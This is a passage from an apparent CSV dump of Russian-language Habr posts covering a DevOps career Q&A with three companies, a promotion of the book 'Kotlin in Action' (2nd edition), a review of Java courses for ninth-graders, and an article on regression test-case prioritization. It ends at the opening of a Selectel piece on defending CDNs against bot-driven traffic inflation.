Jenkins), и знать Linux.Ответ (СберТех):В DevOps важно не только поддерживать инфраструктуру, но и разрабатывать новые решения. Мы активно используем Kubernetes, Terraform, Ansible и другие инструменты для автоматизации. В DevSecOps добавляется работа с информационной безопасностью, что особенно важно в проектах с госорганами.Ответ (Postgres Professional):DevSecOps — это не только про безопасность, но и про интеграцию процессов разработки и эксплуатации. Мы используем инструменты для автоматизации тестирования и мониторинга, чтобы обеспечить стабильность и безопасность наших продуктов.3. Ожидания от сотрудниковВопрос: Какие качества и навыки вы ожидаете от DevOps-инженеров?Ответ (Selectel):Мы ценим самостоятельность, проактивность, ответственность и инициативность. Умение работать в команде, помогать коллегам и постоянно обучаться новым технологиям — это ключевые качества для успешного DevOps-инженера.Ответ (СберТех):Для нас важно, чтобы сотрудник был исполнительным, умел декомпозировать задачи и находить решения. Также важно понимание последствий своих действий и умение работать в команде. Мы ожидаем, что мидл-инженеры будут обладать знаниями Linux, сетевых технологий, а также опытом работы с CI/CD, Terraform, Ansible и Kubernetes.Ответ (Postgres Professional):Мы ищем инженеров, которые умеют работать с базами данных, понимают принципы их работы и могут интегрировать их в процессы CI/CD. Важны навыки работы с PostgreSQL, а также умение автоматизировать процессы и обеспечивать отказоустойчивость систем.4. Компетенции и навыкиВопрос: Какие hard и soft skills необходимы для работы в DevOps?Ответ (Selectel):Hard skills: Linux, Terraform, Ansible, Puppet, Kubernetes, OpenStack, Minio, Ceph, OpenSearch, ELK.Soft skills: умение обосновывать решения, самоорганизация, взаимопомощь, гибкость в обучении.Ответ (СберТех):Мы также добавляем сюда знание сетевого стека, опыт работы с облачными решениями и контейнеризацией. Важны soft skills, такие как самоорганизация, умение управлять временем и коммуникация.Ответ (Postgres Professional):Для нас ключевыми hard skills являются работа с PostgreSQL, знание SQL, а также опыт работы с инструментами мониторинга и автоматизации. Soft skills включают умение работать в команде, гибкость и готовность к постоянному обучению.5. Рабочий день DevOps-инженераВопрос: Как выглядит рабочий день DevOps-инженера?Ответ (Selectel):Утро начинается с проверки состояния инфраструктуры и разработки/рефакторинга модулей. Днем мы обсуждаем задачи, разрабатываем новые сервисы, фиксим баги и изучаем материалы. Вечером занимаемся саморазвитием и подготовкой к конференциям.Ответ (СберТех):Наш день начинается с утреннего созвона, где обсуждаются текущие задачи и приоритеты. Основные задачи включают автоматизацию, решение инцидентов, консультирование коллег и работу с документацией. Важна командная работа и взаимодействие с другими отделами.Ответ (Postgres Professional):Рабочий день начинается с проверки состояния баз данных и мониторинга их производительности. Затем мы занимаемся оптимизацией запросов, настройкой репликации и резервного копирования. Вечером — изучение новых технологий и подготовка к митапам.6. Обучение и развитиеВопрос: Как компании поддерживают профессиональное развитие сотрудников?Ответ (Selectel):У нас есть внутренние курсы, платформы для обучения, ротация между командами и участие в конференциях. Обучение в рабочее время приветствуется, если оно связано с интересами компании.Ответ (СберТех):Мы предлагаем внутренние курсы, доступ к образовательным ресурсам и возможность работать с новыми технологиями, включая искусственный интеллект. У нас также есть программа «Звер-универ», где сотрудники могут проходить курсы бесплатно.Ответ (Postgres Professional):Мы активно поддерживаем обучение сотрудников, предоставляя доступ к курсам по PostgreSQL, а также организуем внутренние митапы и конференции. У нас есть программа наставничества, где опытные инженеры помогают новичкам.7. Собеседования и резюмеВопрос: Как подготовиться к собеседованию и что важно указать в резюме?Ответ (Selectel):В резюме важно описывать конкретные задачи и результаты, а не просто перечислять технологии. На собеседовании мы задаем вопросы о проектах, инструментах, сложных задачах и фейлах. Важно уметь презентовать свой опыт и быть готовым к вопросам по hard и soft skills.Ответ (СберТех):Мы рекомендуем изучить продукт компании и технологии, которые используются. Подготовьте вопросы о команде, проекте и ожиданиях от сотрудника. Будьте готовы рассказать о своем опыте, кейсах и достижениях.Ответ (Postgres Professional):На собеседовании мы задаем вопросы о работе с базами данных, оптимизации запросов и настройке репликации. Важно показать, как вы решали сложные задачи и какие результаты достигли. В резюме укажите конкретные проекты и технологии, с которыми вы работали.8. Культура компанииВопрос: Какая культура в ваших компаниях, и что вы цените в сотрудниках?Ответ (Selectel):Мы ценим проактивность, ответственность, взаимопомощь и нетоксичность. Компания поддерживает work-life balance, организует масштабные корпоративы и мероприятия.Ответ (СберТех):В «Сбертехе» ценятся инициативность, готовность предлагать новые идеи и автоматизировать процессы. Мы поддерживаем развитие сотрудников и создаем условия для работы с передовыми технологиями.Ответ (Postgres Professional):Мы ценим открытость, готовность делиться знаниями и стремление к постоянному улучшению. У нас царит дружеская атмосфера, и мы поддерживаем сотрудников в их профессиональном росте.9. Вакансии и стажировкиВопрос: Какие вакансии и стажировки доступны в ваших компаниях?Ответ (Selectel):У нас есть вакансии для DevOps-инженеров в разных командах, включая облачные базы данных и администрирование сервисов. Стажировки проводятся с целью вырастить из стажёра полноценного сотрудника.Ответ (СберТех):В компании есть вакансии для DevOps-инженеров, включая работу с платформой «Газтех» и продукт-порталом клиента. Формат работы: гибридный или полностью удаленный.Ответ (Postgres Professional):У нас открыты вакансии для инженеров, специализирующихся на PostgreSQL. Мы также предлагаем стажировки для тех, кто хочет углубить свои знания в области баз данных и DevOps.10. Советы для кандидатовВопрос: Какие советы вы можете дать кандидатам, которые хотят стать DevOps-инженерами?Ответ (Selectel):Учите Linux, мониторьте вакансии, не бойтесь ходить на собеседования. Развивайте нетворкинг, используйте реферальные программы. Учитесь презентовать свой опыт и быть готовым к вопросам на собеседовании.Ответ (СберТех):Готовьтесь к собеседованию, изучая технологии и продукты компании. Уделяйте внимание как техническим, так и soft skills. Задавайте вопросы о проекте и команде, чтобы понять, подходит ли вам вакансия.Ответ (Postgres Professional):Начните с изучения PostgreSQL и баз данных. Участвуйте в open-source проектах, чтобы получить практический опыт. Не бойтесь задавать вопросы на собеседованиях и показывать свои знания.ЗаключениеDevOps — это не только про технологии, но и про культуру работы в команде, постоянное обучение и готовность решать сложные задачи. В Selectel, Postgres Professional и СберТех созданы условия для профессионального роста, и каждая из компаний предлагает уникальные возможности для развития в этой области.Если вы хотите стать частью команды DevOps, начните с изучения ключевых технологий, подготовки к собеседованиям и поиска компании, которая разделяет ваши ценности и поддерживает ваш рост. Удачи в карьере!«DevOps Bootcamp с Федосеевым» — канал для тех, кто хочет стартовать в DevOps. Лайв-эфиры и вебинары с экспертами индустрии, разборы задач, закулисье работы DevOps — по ссылке.Освоить методологию DevOps и получить новую профессию — на курсе «DevOps Upgrade»."
23,"Книга: «Kotlin в действии, 2-е изд.»",Издательский дом «Питер»,Компания,0,"СМИ, Электронная коммерция, Производство мультимедиа-контента",2025-04-10,"Привет, Хаброжители!  Вы все еще пишете на Java?   Тогда мы идем к вам – с Kotlin, корутинами и null-безопасностью.   Второе издание «Kotlin в действии» – это полноценный манифест современной JVM-разработки.   Авторы, стоявшие у истоков создания языка в JetBrains, делятся не только синтаксисом, но и философией Kotlin – делать код короче, безопаснее и приятнее в поддержке.   От Java с любовью: как появился Kotlin В далёком 2010 году компания JetBrains была авторитетным поставщиком инструментов разработки для таких языков, как Java, C#, JavaScript, Python, Ruby и PHP. Интегрированная среда разработки (IDE) для языка Java под названием IntelliJ IDEA была основным продуктом и содержала плагины для Groovy и Scala. Большой опыт создания инструментария для такого набора языков способствовал получению уникального знания. Именно это помогло работникам JetBrains сформировать особый взгляд на пространство языкового дизайна в целом. Но среды разработки на платформе IntelliJ, в том числе IntelliJ IDEA, по-прежнему разрабатывались на Java.  Успех коллег из команды .NET, работающих на C# — современном, мощном и быстро развивающемся языке, вызвал чувство зависти, но найти язык, который смог бы заменить Java, не представлялось возможным. Поэтому разработчики начали с простого: сформировали перечень требований к нему.  Статическая типизация.  Полная совместимость с имеющимся кодом, написанным на Java. Существующая кодовая база — очень ценный актив для компании JetBrains. Отсутствие компромиссов в части качества инструментария разработки. Продуктивность разработчиков — самая важная ценность для JetBrains, и для достижения ее высоких показателей необходимы отличные инструменты Язык для обучения должен быть лёгким, обсуждение его конструкций не должно было вызывать затруднений  И так как потребность в новом языке встречалась и у других компаний, то решение проблем могло заинтересовать пользователей за пределами JetBrains. Исходя из этого, было решено приступить к проекту создания нового языка — Kotlin.  Релиз Kotlin 1.0 состоялся более чем через пять лет после первой фиксации нового кода в репозитории. С тех пор у языка сформировалась своя аудитория, он вырос в прекрасную активную экосистему.  Язык назван в честь острова (Котлин), находящегося неподалеку от города Санкт-Петербург в России. На это решение повлиял прецедент, созданный разработчиками языков Java (остров Ява) и Ceylon (остров Цейлон).  В процессе подготовки языка к релизу пришло понимание, что было бы полезно написать о нем книгу. И ее авторами должны были стать люди, которые участвовали в принятии проектных решений для языка и могут объяснить, почему Kotlin устроен именно так. Эта книга представляет собой результат их работы.   Результат превзошел ожидания. Сегодня Kotlin – простой и высокопроизводительный язык программирования, достаточно гибкий для работы с любыми веб-, мобильными, облачными и корпоративными приложениями.   Если ваш Java-код напоминает древние руны, а каждый новый фреймворк требует изучения отдельного трактата — возможно, пора переходить на Kotlin.   Почему авторам можно верить? Это не очередной «Kotlin для чайников». Познакомьтесь с авторским коллективом:  Себастьян Айгнер — адвокат разработчиков в компании JetBrains. Он регулярно выступает на конференциях и проводит семинары по темам, связанным с Kotlin. Кроме того, работает ведущим подкаста Talking Kotlin и создает видеоролики для официального канала Kotlin на YouTube. Будучи членом организации Kotlin Foundation, помогает поддерживать рост и устойчивость экосистемы.  Роман Елизаров был руководителем проекта Kotlin в компании JetBrains и в течение семи лет занимался разработкой языка Kotlin в роли ведущего дизайнера языка. Ранее проектировал и разрабатывал высокопроизводительное торговое программное обеспечение для ведущих брокерских компаний и служб доставки рыночных данных, которые регулярно обрабатывают миллионы событий в секунду. Работая над Kotlin в компании JetBrains, внес вклад в разработку корутин Kotlin и создание библиотеки корутин Kotlin.  Светлана Исакова начинала свою карьеру в команде разработчиков компилятора Kotlin, а сейчас занимает должность адвоката разработчиков в компании JetBrains. Преподает Kotlin и выступает на конференциях по всему миру. Кроме того, приняла участие в создании курса Kotlin для Java-разработчиков на платформе Coursera и стала соавтором книги Atomic Kotlin (Mindview LLC, 2021).  Дмитрий Жемеров был в числе первых разработчиков языка Kotlin на заре проекта. Хорошо знаком с устройством языка и причинами решений, принятых в ходе его разработки. Во время работы в компании JetBrains занимался различными темами, связанными с Kotlin, в том числе плагином IntelliJ IDEA для Kotlin и документацией по новому языку.  Когда эти люди рассказывают про Kotlin – это как читать Торвальдса, объясняющего устройство Linux.  Кто оказал помощь в повышении качества русскоязычного перевода:  Анна Жаркова — энтузиаст мобильной разработки, эксперт Kotlin, руководитель мобильной практики в компании Usetech, ведет Telegram-канал «Записки разработчицы».  Сергей Задорожный — руководитель Platform Engineering и Enabling Team в банке «Центр-инвест». Разрабатывал backend на Java/Kotlin, сейчас внедряет DevOps-практики. Ведет Telegram-канал «IT Friday».  Что нового во втором издании? Первое издание «Kotlin в действии» стало библией для тех, кто перешёл с Java. Во втором существенно расширено описание корутин, структурированного параллелизма и других новых возможностей языка.  Версия — Kotlin 2.0.  Особенно ценно, что книга написана не техническими писателями, а самими создателями языка. Вы узнаете не только «как», но и «почему именно так» устроен Kotlin.  Для кого эта книга? Идеальный читатель:  Java-разработчик,  Разработчик на C# или JavaScript, но может потребоваться информация из дополнительных источников для понимания более сложных аспектов взаимодействия Kotlin с JVM, Разработчик серверной части или Android-разработчик, создающие проекты на базе JVM.  Структура книги Книга делится на три логических блока:  Часть 1: как использовать Kotlin с существующими библиотеками и API  Ключевые цели, ценности и области применения Kotlin, Различные способы запуска кода Kotlin, Объяснение основных элементов любой программы на Kotlin, в том числе структур управления и объявлений переменных и функций, Способы объявления функций в Kotlin и вводится понятие функций-расширений и свойств, Объявления классов: понятия классов данных и объектов-компаньонов, Лямбда-выражения в Kotlin: ряд функций стандартной библиотеки Kotlin, которыми можно воспользоваться с помощью лямбд, Подходы к работе с коллекциями в Kotlin, а также их отложенный аналог — последовательность, Null-безопасность, Система типов Kotlin и коллекции.  Часть 2: научитесь создавать собственные API и абстракции на языке Kotlin, узнаете о некоторых более сложных возможностях языка.  Принцип конвенций, которые позволяют наделить особым смыслом методы и свойства с определенными именами,  Делегированные свойства, Объявление функций высшего порядка, Концепция встроенных функций, Обобщения в Kotlin: от базового синтаксиса к параметрам вещественного типа и вариативности, Аннотации и рефлексии; особое внимание уделяется небольшой библиотеке сериализации JSON под названием JKid, Предметно-ориентированные языки (DSL), описываются инструменты Kotlin для их создания и демонстрируется множество примеров применения DSL.  Часть 3: Корутины и потоки  Обзор модели конкурентности в Kotlin, в том числе приостанавливаемых функций, корутин и основных способов написания конкурентного кода, Концепция структурированной конкурентности, на которой строится управление конкурентными задачами, Механизмы отмены и обработки ошибок, Потоки – абстракция на основе корутин. Она используется для моделирования последовательных потоков значений во времени, Операторы преобразования потоков в Kotlin, Обработка ошибок и тестирование конкурентного кода.  Рекомендации, как читать  Новичкам – от корки до корки Опытным – выборочно по нужным темам  Как говорил один умный человек: «Сначала ты работаешь на Java, потом Java работает на тебя, а потом ты переходишь на Kotlin». Или не говорил. В любом случае, добро пожаловать на светлую сторону силы!  Ознакомьтесь с книгой «Kotlin в действии, 2-е изд.»  на нашем сайте.  » Оглавление » Отрывок  По факту оплаты бумажной версии книги на e-mail высылается электронная книга. Для Хаброжителей скидка 25% по купону — Kotlin"
24,Какие есть курсы программирования для учеников 9-го класса? Обучение будущей профессии или хобби?,IT для детей,Компания,0,"Веб-разработка, Производство мультимедиа-контента, Игры и развлечения",2025-04-10,"Привет! На связи Ксюша – автор статей в блоге «IT для детей». Пишу о различных направлениях дополнительного айти-обучения школьников, делаю это для них и их родителей, подыскивающих курсы. Стараюсь рассказывать максимально просто о сложном и анализирую частные образовательные организации и их предложения в направлении программирования.Сегодня хочу коснуться такой темы, как обучение кодингу 9-классников. Затрону очевидные и неочевидные моменты с упором на собственный опыт, расскажу о том, почему именно 9-й класс – хорошее время для старта, а также приведу примеры курсов, представлю раздел FAQ с распространенными вопросами и поделюсь ссылками на тематические статьи, ранее уже опубликованными в блоге.Почему стоит начать изучать программирование в 9-м классеЗдесь и далее условимся, что речь о возрастном рубеже в виде 15 лет: многие 9-классники подпадают под данную характеристику. И именно в рамках соответствующего периода подростки могут быть описаны следующими аспектами:Недостаточное понимание того, какой маршрут образования выбрать после школы. IT-курсы программирования после 9-го класса или во время учебы в нем могут стать отличным инструментом для разрешения обозначенной проблемной ситуации. Но только при условии, что налицо склонность и интерес к теме, ведь в иной ситуации обучение кодингу не даст ожидаемых эффектов;Достаточное понимание основ. Речь о том, что типичный 15-летний подросток уже ориентируется в информационных технологиях, знает об устройстве компьютера и об алгоритмах, умеет использовать интернет и прикладные программы, что становится комплексной предпосылкой для более успешного дополнительного обучения в направлении IT;Открытость для чего-то нового. Это аргумент в пользу внеурочных занятий в целом, ведь подростки активно впитывают новую информацию и способны с охотой развиваться в том, что им нравится. Простой пример – разработка игр, сайтов и приложений, что увлекает множество современных детей.Часто встречаю мнения вроде того, что курсы вряд ли приведут к осознанному выбору маршрута образования после школы и к профессиональному самоопределению, но в одной из других статей обосновала обратное. Ссылку опубликую в конце.Чему удастся научиться на курсах информатики и программирования в 9-м классеЭто зависит от содержания образовательной программы конкретного курса. Потому как часто обозреваю соответствующие предложения, могу с уверенностью утверждать, что наиболее распространенные варианты следующие:Создание игр на Unity. Это игровой движок с широким функционалом. Считаю преимуществом, что в основу тематических курсов для детей и подростков входят, помимо прочего, блоки теории и практики использования C#. Без данного языка полноценное пользование «Юнити» становится невозможным;Веб-разработка с использованием JavaScript, HTML и CSS. Первый – язык сценариев, второй и третий – инструменты, предназначенные для гипертекстовой разметки документов и управления их визуалом соответственно. Если совсем просто, то речь о т. н. триаде веб-разработки, благодаря которой можно создавать сайты, удаленные приложения и различные онлайн-сервисы;Создание игр и приложений на Python. Это еще один достаточно распространенный и вместе с тем востребованный вариант, но отмечу другое: изучать программирование на Python в 8–9-м классе можно как в т. н. сухом виде, так и с привязкой к разработке модов, скажем, для Майнкрафта. Конкретный вариант стоит выбирать с учетом того, какие навыки у ребенка уже сформированы.Так, на курсах удастся научиться:Писать код на конкретном языке;Создавать игры;Разрабатывать сайты, приложения и не только.Какие «взрослые» привычки, полезные с точки зрения написания кода, удастся выработать и прокачать на курсах программирования в 9-м классеУже на вводных уроках и условно-простых курсах в целом подростки будут не только осваивать теорию, но и выполнять различные проекты, связанные с программированием. Благодаря этому в большинстве случаев складываются и начинают развиваться способности, полезные с точки зрения:Работы в команде;Разложения сложных задач на мини-цели для упрощения решениях первых;Тестирования написанного кода, его проверки на предмет ошибок;Достижения целей, ведь та же проектная деятельность формирует целеустремленность;Самостоятельности, потому как будут, помимо прочего, индивидуальные проекты и домашние задания.Что еще дадут курсы по основам программирования для 9-го классаИз представленных сведений понятно, что в первую очередь занятия станут полезными с точки зрения профессионального самоопределения и подготовки к обучению в вузе после школы. Вместе с тем спешу отметить, что удастся:Подготовиться к олимпиадному программированию на том же «Питоне»;Упростить поступление в выбранный университет, ведь получиться разобраться в неочевидных вещах, часто встречающихся на внутренних вступительных экзаменах;Обрести полезное хобби, которое вполне может стать основой фриланса. Уже во время курсов стоит попробовать искать простые заказы на биржах вроде FL.ru.Теперь к традиционной рубрике: собрала и проанализировала несколько курсов, которые подойдут 9-классникам, или ребятам 15 лет. Упор поставила на Java: это еще один язык, который пусть и не был отмечен ранее, но может быть описан как перспективный и полезный.Примеры курсов, на которых 9-классникам удастся разобраться в программированииИтак, стержневой критерий – Java, дополнительный – онлайн-уроки: считаю их более доступными. Также уделила внимание следующим моментам:Стоимость;Возрастные рамки;Проекты;Прогнозируемые результаты.Как и в других публикациях, предусмотрела ссылки: они помогут узнать больше о курсе, который покажется примечательным.Обучение программированию на Java в 9-м классе: онлайн-курсСтоимость: 800 рублей за урок в среднем.Возрастные рамки: 14–17 лет.Проекты: программа, выводящая числа в рамках заданного диапазона; программная таблица умножения; 2Д-фигуры с циклами; ряд веб-приложений и т. д.Прогнозируемые результаты: умение создавать удаленные приложения, уверенное использование Java, понимание объектно-ориентированного программирования, устройства фреймворков и сред разработки.Ссылка: https://pixel.study/java-for-childrenОсновы Java для детейСтоимость: минимум 950 рублей за занятие.Возрастные рамки: 12–17 лет.Проекты: заявлено, что практика будет, но без конкретизации.Прогнозируемые результаты: владение Java, понимание роли языка в разработке различных программ.Ссылка: https://easypro.academy/courses/javaКурс кодинга на языке «Джава»Стоимость: от 3 700 рублей за модуль.Возрастные рамки: 11+ лет.Проекты: игра «Новогодний дождь», виртуальный калькулятор и т. д.Прогнозируемые результаты: уверенное использование языка, способность выполнять несложные проекты.Ссылка: https://uc1.1c.ru/course/programmirovanie-na-yazyke-java/Онлайн-курс программирования на JavaСтоимость: около 900 рублей за урок.Возрастные рамки: 12–17 лет.Проекты: крестики и нолики, неуточненный финальный проект.Прогнозируемые результаты: использование Джавы на уровне новичка, способность применять язык для веб-разработки.Ссылка: https://progmatica.innopolis.university/courses/basic/javaТак, с примерами все, но не прощаюсь и хочу подчеркнуть, что старт в программировании в 9-м классе или обучение после него – действительно полезное занятие. Оно поможет сформировать хобби, которое станет основой будущей профессии, а также ускорит общее развитие каждого ребенка в эпоху цифровых технологий. При этом именно подростковый возраст – идеальный момент для полностью осознанного обучения, где развлечения – второстепенны, а ценные знания и навыки – первичны.FAQПредставила ряд распространенных вопросов по теме и дала на них ответы.Какой курс по информационным системам и программированию выбрать в 9-м классе?Выбор рекомендую делать с учетом интересов ребенка и при условии тщательного анализа всех аспектов, характеризующих направление и организатора. Цена, форматы, отзывы, выгоды, содержательность образовательной программы – важные моменты.Конкретный пример курса не привожу, потому что не занимаюсь рекламой, поэтому предлагаю вам найти занятия самостоятельно.Есть ли учебники для самостоятельных занятий?В интернете есть много обучающих материалов в формате видео, текстовых руководств и даже полноценных учебников. Достаточно определиться с направлением и найти тематические источники.С какого курса лучше начать учиться 9-класснику?Подойдет один из вариантов, представленных в статье. Это Unity, JavaScript, Python и Java. Разработка игр подойдет ребятам, увлекающимся геймингом, создание веб-сайтов – детям, проводящим время в виртуальных сервисах, на развлекательных сайтах, и т. д.Полезные статьи по темеКак и обещала, делюсь полезными тематическими публикациями. Вот они:Курсы программирования для 8–11-х классов как путь к будущей профессии;Обучение в клубе программирования для детей: нетворкинг для юных кодеров. "
25,"Приоритизация тест-кейсов или как пройти регресс, не потеряв рассудок",Программный Продукт,Создаем решения для государства и бизнеса,0,"Веб-разработка, Программное обеспечение, Оптимизация",2025-04-10,"Если рассуждать о сути приоритизации тест-кейсов и ее роли в процессе тестирования, прежде всего стоит обозначить те ситуации, в которых данный подход проявляет себя наиболее явно. Как правило, приоритизация тест-кейсов становится особенно актуальной в рамках регрессионного тестирования, когда возникает необходимость выявления потенциальных уязвимостей продукта и подтверждения его соответствия заданной логике поведения без критических ошибок.Для начала необходимо определить отправную точку этого процесса. То есть от чего мы отталкиваемся, когда запускаем регрессионное тестирование?Чаще всего мы принимаем во внимание последние изменения в продукте. Пытаемся определить, какие именно области системы подвержены наибольшему риску возникновения регрессионных дефектов. Следовательно, эти области требуют наиболее тщательного повторного тестирования, чтобы гарантировать сохранение текущей функциональности и исключить появление нежелательных побочных эффектов, способных нарушить стабильную работу продукта.Если уйти от идеализации, то обычно в начале регрессионного тестирования мы видим огромное количество тест-кейсов в виде большого списка, который, как правило, структурировано выделен по папкам и разбит на модули, связанные между собой. Такое тестирование занимает большой объем работы и времени, а главная задача — это не упустить ничего, что может блокировать нам использование нашего продукта.  На выходе мы имеем: высокий уровень ответственности и ограниченное количество отведенного времени на эту работу. Так как же мы можем оптимизировать и облегчить себе работу во время регрессионного тестирования и при этом не упустить критических багов? Одним из наиболее доступных решений является приоритизация тест-кейсов. Теперь разберемся, что такое приоритизация тест-кейсов и как ее использовать в период регрессионного тестирования: Приоритизация тест-кейсов — это процесс в тестировании, который помогает нам определить наиболее значимые тесты и порядок их выполнения. Процесс особенно актуален в контексте регрессионного тестирования, так как из большого объема тестов нужно выделить “главные”, чтобы систематизировать свой подход.А для чего нам давать приоритет тестам, если среди них нет “неважных” во время регресса? Ведь все тест-кейсы, которые добавлены в регресс, уже выделены как основные и дают возможность в полном объеме протестировать весь продукт или часть модуля. Все равны, но некоторые равнееМожно выделить несколько пунктов, которые аргументируют правильность такого подхода в тестировании:1.     Помогает оптимизировать нашу работу в ходе регрессионного тестирования. Несомненно, это сокращает нам время, отведенное на проведение регресса, и позволяет выявить наиболее влиятельные баги на начальном этапе тестирования. Приоритизация, в первую очередь, помогает нам сосредоточиться на наиболее критических аспектах нашего проекта в ходе регрессионного тестирования, а это, в свою очередь, позволяет сократить трудозатраты и время на тестирование. Особенно, если регресс включает в себя свыше 1000 тестов, а сроки позавчера-вчера.2.     Уменьшает риски пропустить дефекты тестируемого продукта. Этот подход помогает минимизировать риск не заметить дефекты в тестируемом продукте. Приоритизация тестов, основанная на предыдущих результатах, позволяет выявлять и устранять критические баги на ранних этапах регрессионного тестирования. Кроме того, мы можем отслеживать влияние каждого обнаруженного бага на конкретные тест-кейсы, что упрощает анализ и исправление проблем в дальнейшей работе.3.     Своевременная обратная связь по устранению найденного бага.Разработчик получит критические баги на ранних этапах тестирования, вместо минорных задач. Это позволяет нам быстрее избавиться от дефектов, которые нам блокируют прохождение других тест-кейсов в регрессе.4.     Концентрация внимания на уязвимые места нашего продукта. Распыление на мелочи не дает нам возможности проверить серьезные пользовательские сценарии и найти более критические дефекты. Если мы изначально сосредоточились на приоритетных тест-кейсах, которые отражают основную идею нашего продукта и наша задача убедиться в том, что наш функционал работает, то сделать это проще, если расставлены приоритеты и мы знаем с чего нужно начать регрессионное тестирование.5.     Защита от выгорания после пройденного регресса. Мысль о том, что более важная и сложная часть работы уже пройдена и осталось только подчищать, дает нам бессознательное чувство спокойствия и того, что у нас все находится под контролем. После проделанной работы у нас есть уверенность в том, что мы проверили самые важные и уязвимые пользовательские сценарии, а значит нужно отсечь “нюансы”. Благодаря такому подходу мы меньше тратим моральных сил и оставляем запас на дальнейшую доработку продукта. Мы поняли, что такое приоритизация и какие плюсы она дает. Но как понять, что тест является наиболее приоритетным среди других тестов?Не существует универсального ""рецепта"" для приоритизации тест-кейсов. Наиболее эффективный подход – это создание собственного фреймворка, адаптированного под конкретные цели и задачи нашего проекта. Прежде всего, нужно четко определить, чего мы хотим достичь с помощью приоритизации: сократить время регрессионного тестирования, минимизировать риски, улучшить качество продукта или что-то другое? Затем выбираем критерии приоритизации, которые напрямую связаны с этими целями. Например, для стартапа, фокусирующего на MVP, приоритет будет отдан тестам, гарантирующим работу ключевой функциональности, критически важной для пользователей. А для существующего продукта, переживающего период изменений, в приоритете будут тесты, которые проверяют стабильность часто меняющихся модулей. Это поможет избежать внезапных поломок и обеспечить плавный переход к новым версиям продукта.Для наглядности можно выделить несколько критериев, которые мы используем во время приоритизации:  1.     Зависимость других тестов от одного тест-кейса.Подразумевается, что можно обозначить тест-кейс, который будет блокировать нам успешное прохождение других тестов в случае дефекта. Другими словами, дать приоритет тест-кейсу можно на основе того, какую проверку он в себя закладывает. Если тест отражает основную работу нашего функционала, то он может стать наиболее приоритетным. 2.     Объем и время, затраченные на один тест-кейс.Чем больше шагов при прохождении тест-кейса, тем больше вероятность, что на одном из шагов всплывет ошибка. Также время на них уходит намного больше, чем на простые тесты. Благодаря этому сложность тест-кейса может увеличиться, как и вероятность того, что мы упустим дефект.3.     Тест-кейсы, которые охватывают часто изменяемые части кода. Такие тесты могут стать приоритетными, потому что недавно измененный модуль может задеть собой работу основного функционала нашего продукта. Если суть нашего регрессионного тестирования в том, чтобы убедиться, что после всех этих изменений наша программа работает так же, как и раньше, и ничего не сломалось, то логично начать именно с тех мест, где что-то меняли, потому что там больше всего вероятно найти проблемы.4.     Негативные пользовательские сценарии.Нельзя забывать и про плохие сценарии, то есть про то, как система не должна себя вести. Такие негативные тесты тоже очень важны. Если наша задача – найти все косяки и баги, то проверять, что система не делает чего-то плохого, нужно в первую очередь.И так далее, вариантов много, главное понять, какой критерий дает больше шансов качественно провести тестирование, отталкиваясь от причины запущенного регресса. Для большей ясности и иллюстрации сказанного предлагаем рассмотреть несколько конкретных примеров, основанных на сценариях авторизации пользователя в системе и совершение им покупки:1.     Пример “Зависимость других тестов от одного тест-кейса” Приоритетность тест-кейсов может зависеть от возможности совершения покупки без авторизации. Если покупка без авторизации возможна, то приоритет отдается тест-кейсам, описывающим этот сценарий, как основную функцию продукта. В противном случае, когда авторизация обязательна, критически важными становятся тесты, проверяющие авторизацию, так как они блокируют все последующие сценарии, зависящие от нее. 2.     Пример “Объем и время, затраченные на один тест-кейс”Тест-кейс, имитирующий полный пользовательский путь покупки в интернет-магазине (от выбора товара до оформления заказа), включает проверку: корректного отображения каталога, добавления товаров в корзину и успешного оформления заказа.Именно многоэтапность делает этот тест-кейс приоритетным. Сбой на любом из этих шагов напрямую влияет на возможность пользователя совершить покупку. Чем больше шагов необходимо для успешного выполнения теста, тем выше риск возникновения дефекта.  Кроме того, комплексность этого сценария повышает вероятность возникновения неочевидных, ""плавающих"" багов, которые сложно выявить другими способами. Это оправдывает высокий приоритет тест-кейса, так как неудача на любом этапе означает невозможность совершения покупки.3.     Пример “Тест-кейсы, которые охватывают часто изменяемые части кода” Изменения в часто меняющихся модулях с большей вероятностью могут повлиять на стабильность системы и основной функционал. Если недавно была переработана система авторизации пользователей, то необходимо в первую очередь протестировать все сценарии входа, регистрации, восстановления пароля. Или, если было обновление работы с платежами, нужно уделить особое внимание проверке всех этапов процесса оплаты и возвратов. Такие кейсы можно выделять, если было запущено регрессионное тестирование после точечных изменений в продукте.4.     Пример “Негативные пользовательские сценарии”В контексте авторизации, одним из ключевых негативных тест-кейсов может быть проверка того, что система эффективно предотвращает ввод только пробелов в поле ""Имя"" при регистрации нового пользователя. Это важно, поскольку наличие только пробелов в этом поле не имеет логического смысла и может привести к серьезным последствиям.  Во-первых, такая ситуация может вызвать трудности с однозначной идентификацией пользователя в системе, что затруднит его дальнейшее взаимодействие с приложением.  Во-вторых, это может привести к проблемам с обработкой данных, так как система может некорректно обрабатывать записи с пустыми значениями в критически важных полях.Таким образом, приоритизация в тестировании – это не жесткий свод правил, а гибкая методология, требующая постоянной адаптации к меняющимся условиям проекта и возникающим вызовам. Хорошо продуманная система приоритетов не только оптимизирует процесс тестирования и повышает качество выпускаемого продукта, но и способствует формированию более благоприятной и стабильной рабочей атмосферы. Работая с четко определенными ориентирами, мы можем оперативно реагировать на любые непредвиденные обстоятельства. Осознание того, что наши усилия направлены на решение наиболее важных задач, повышает мотивацию и способствует более рациональному использованию имеющихся ресурсов.  В конечном счете это приводит к повышению лояльности как со стороны тестировщиков, так и со стороны конечных пользователей, которые получают продукт, максимально отвечающий запросам и ожиданиям, а также способный оперативно адаптироваться к динамично меняющимся требованиям современного рынка."
26,Инструменты CDN: шесть способов остановить накрутку трафика на сайт,Selectel,IT-инфраструктура для бизнеса,0,"Аппаратное обеспечение, Связь и телекоммуникации, Домены и хостинг",2025-04-10," Привет, Хабр! Когда компании используют CDN (Content Delivery Network) для ускорения сайтов и приложений, они нередко сталкиваются с резким ростом трафика, который не связан с реальными пользователями. Такая проблема увеличивает загрузку контента и задержку в сети, в худшем случае — приводит к огромному счету за услугу CDN. Для компаний это может стать серьезной финансовой нагрузкой.  Часто причиной увеличения трафика становятся конкуренты, которые используют ботов и скрипты для отправки тысяч запросов на ресурс. В результате вместо стандартного 1 ТБ в месяц клиент может потребить 500 ТБ за три дня, а его чек вырастет в 1 000 раз. В тексте разберем, как определить накрутку трафика и какие меры предпринять для защиты.  Как работает накрутка трафика Обычно накруткой считают процесс искусственного увеличения посещаемости веб-ресурса. Ниже рассмотрим основные виды атак на CDN.   Массовые запросы. Боты генерируют тысячи запросов к файлам. Обычно всплески трафика происходят в нехарактерное время для ресурса — например, когда 